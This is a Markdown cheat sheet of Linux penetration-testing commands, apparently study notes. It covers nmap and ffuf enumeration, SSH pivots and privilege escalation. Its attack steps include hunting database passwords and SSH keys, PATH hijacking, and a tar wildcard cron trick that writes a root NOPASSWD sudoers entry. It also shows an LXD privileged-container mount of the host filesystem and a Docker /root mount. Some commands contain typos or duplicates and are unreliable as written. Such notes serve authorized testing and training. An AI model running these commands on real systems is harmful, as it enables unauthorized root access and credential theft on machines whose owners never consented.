# Linux Recon & Attack

## Enumeration
### Scans
```bash
sudo nmap -p- -sC -sV $IP --open -oA scans/nmap_Initial
```
### Fuzzing
Fuzz Directories
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt:FUZZ -u http://<Domain or IP>/FUZZ -fs 278
```
Fuzz Subdomains
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://<Domain or IP> -H "Host:FUZZ.<Domain or IP" -fw 20
```
Fuzz Files
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt -u http://<Domain or IP>/FUZZ -e .php,.html,.txt -fs 283
```
## Credentialed Enumeration
==What's Listening?
```bash
netstat -tulpn
```
## Databases
### MySQL
```bash
mysql -u <user> -p<pass> -h <host> <db>#No space between -p and the password (ex: -pPassword)
```

## Pivots
### SSH Socks4 Dynamic
```bash
ssh -D 9050 <user>@<host>
```
Change browser settings to socks4 proxy 127.0.0.1:9050 to route web traffic

Proxychains settings located in /etc/proxychains4.conf
```bash
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks4  127.0.0.1 9050
```
For app traffic, prepend "proxychains4" before command
Example:
```bash
proxychains4 curl http://<site>.<dom>/<page>
```
### SSH Simple Port forward (Useful to forward to a website only available from target machine)
```bash
ssh -L 8080:localhost:52846 <user>@<target>
```
## PrivEsc
### Environmental
First
```bash
whoami
id
hostname
ip -a
sudo -l
```
Sudo - List User's Priv
```bash
sudo -l
```
Possible Passwords
```bash
cat /etc/passwd
grep "*sh$" /etc/passwd #Find only users with login shells, and which shell they have.
```
Bash History
```bash
history
```
List current Processes
```bash
ps aux
```
Cron Jobs
```bash
ls -la /etc/cron.daily
```
File Systems & Additional Drives
```bash
lsblk
cat /etc/fstab
cat /etc/fstab | grep <password/username/credential/etc>
```
Find Writable Directories
```bash
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
```
Find Writable Files
```bash
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
```
OS Release
```bash
/etc/os-release
```
Current Users Path
```bash
echo $PATH
```
Current Users Enviornment
```bash
env
```
Current Kernel Version
```bash
uname -a
cat /proc/version
```
List Login Shells
```bash
cat /etc/shells
```
Routing Table
```bash
route
netstat -rn
```
Arp Table
```bash
arp -a
```
Existing Groups
```bash
cat /etc/group
```
Get all members of a group
```bash
getent group sudo
```
Mounted File Systems
```bash
df -h
```
Unmounted File Systems
```bash
cat /etc/fstab | grep -v "#" | column -t
```
All Hidden Files
```bash
find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep <username>
```
All Hidden Directories
```bash
find / -type d -name ".*" -ls 2>/dev/null
```bash
Temp Files
```bash
ls -l /tmp /var/tmp /dev/shm
```
### Services & Internals
Network Interfaces
```bash
ip -a
```
Hosts
```bash
cat /etc/hosts
```
Users Last Logins
```bash
lastlog
```
Currently Logged in Users
```bash
w
```
Command History
```bash
History
```
Find History Files
```bash
find / -type f \( -name *_hist -o name *_history\) -exec ls -l {} \; 2>/dev/null
```
Cron
```bash
ls -la /etc/cron.daily
```
Proc
```bash
find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"
```
Installed Packages
```bash
apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
```
Sudo Version
```bash
sudo -v
```
Binaries ([GTFOBins](https://gtfobins.github.io/))
```bash
ls -l /bin /usr/bin/ /usr/sbin/
# Compare system bins to gtfobins (This needs work)
#for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done
```
Trace System Calls
```bash
strace <bin>
```
Find Configuration Files
```bash
find / -type f\( -name *.conf -o -name *.config\) -exec ls -l {} \; 2>/dev/null
```
Find Scripts
```bash
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
```
Running Services by User
```bash
ps aux | grep <user>
```
### Credential Hunting

Web/DB Credentials
```bash
cat wp-config.php | grep 'DB_USER\|DB_PASSWORD' # Use on any config files you find in /var
```
SSH Keys
```bash
ls ~/.ssh
```

### Path Abuse

```bash
echo $Path
# Remember any script or program in a directory specified in the path is executable from any directory on the system
```
Add Current Directory to the path
```bash
PATH=.:${PATH}
export PATH
```
Script to modify a command in path
```bash
touch ls
echo 'echo "PATH ABUSE"' > ls
chmod +x ls
```
### Wildcard Abuse
```bash
*   An Asterisk that can match any number of characters in a file name
?   Matches a single character
[]  Brackets close characters and can match any single one at the defined position
~   Tilde refers to a  home director
-   a Hyphen with brackets will denote a range of characters
```
Simple script to abuse a cron job
```bash
echo 'echo "<user> ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint =1
```
### Escaping Restricted Shells

Command Injection
```bash
ls -l 'pwd' # Injected a pwd command into the argument of ls
```
Command substitution
Try executing a command in backticks, etc.

Command Chaining = Try using multiple commands chained together, separated by a pipe or semicolon

ENV Variables

Shell Functions

### Special Permissions
Look for SUID Bit = Shows as an s in permissions

Find SetGid permission
```bash
find / -uid 0 -perm -6000 -type f 2>/dev/null #Can be leveraged the same as SUID binaries
```

Again, check [GTFOBins](https://gtfobins.github.io)

### Priviliged Groups

LXC/LXD  
All users added to LXD group at install.  
Usage = Create LXD container, make it privileged, and then access host file system at /mnt/root  
Process:  
```bash
id #Verify you are in the (lxd) group

unzip alpine.zip #Unzip alpine image

lxd init #Accept all defaults

lxc image import alipine.tar.gz alpine.tar.gz.root --alias alpine #Import the local image

lxc init alpine r00t -c security.privileged=true #Start privileged container make container root the same as host root.

lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true #Mount the host file system

lxc start r00t

lxc exec r00t /bin/sh #Spawn a shell inside the container
```


Docker
```bash
docker run -v /root:/mnt -it ubuntu #Creates a new docker instance with /root on the host mounted as a volume at /mnt
```

Disk  
Members of the (Disk) group have access to any devices within /dev, including /dev/sda1 (usually the main OS drive)  

ADM  
Members of the (ADM) group have access to all logs in /var/log. Not directly root, but good recon!


